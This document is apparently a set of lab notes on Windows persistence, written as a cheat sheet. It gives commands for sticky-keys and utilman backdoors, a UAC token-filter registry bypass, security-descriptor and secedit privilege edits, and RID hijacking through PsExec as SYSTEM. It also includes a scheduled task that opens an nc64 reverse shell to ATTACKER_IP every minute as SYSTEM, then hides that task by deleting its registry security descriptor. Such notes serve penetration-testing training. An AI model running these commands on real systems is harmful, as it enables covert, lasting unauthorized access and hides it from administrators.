# Windows Persistence 

tags: #persistence #backup #rdp #winrm #registry #powershell #secedit #scheduledTask 

## Backdooring files and replacing them with cmd.exe or similar
Use stickykeys or utilman.exe to plant a backdoor that can be accessed through the logon screen of windows 10

To see which groups you belong too...
```cmd
whoami /groups
```

## Backdooring with security descriptors

The Backup Operators windows group allows you to read/write any file or registry key, this access would allow you to be able to copy the content of SAM and SYSTEM registry hives, however this account would not have RDP access or WinRM access which requires membership in the Remote Desktop Users group and the Remote Management Users group

UAC will block the use of the "Backup Operators" group as a user until you run this registry key change

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

You can create a backdoor with a user where you can modify the session configuration of powershell and add your user account with full control.  This allows the modification of the settings. 

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

To drop the security descriptors of the local machine as they are applied
```cmd
secedit /export /cfg config.inf
```

After you drop the security descriptors of the machine you can change then by adding user accounts comma separated.  Then you can re-import the privileges to modify them.  You do need to make the registry change above to bypass UAC

```cmd
secedit /import /cfg config.inf /db config.sdb
```

AND

```cmd
secedit /configure /db config.sdb /cfg config.inf
```

## RID Hijacking

Query using WMIC the current SIDs
```cmd
wmic useraccount get name,sid
```

Only the SYSTEM user can modify the RID of an account, use psexec64.exe to access the registry editor as the SYSTEM account

```cmd
PsExec64.exe -i -s regedit
```


## Task Schedule - Making the task invisible

Creates a task to run under system every 1 minute
```cmd
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```

Query tasks by name
```cmd
schtasks /query /tn thm-taskbackdoor
```

If you want to hide the task, remove the security descriptor for the task in the registry.  Launch with psexec with system privileges then remove the security descriptor

```cmd
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<taskname> Registry Key SD
```





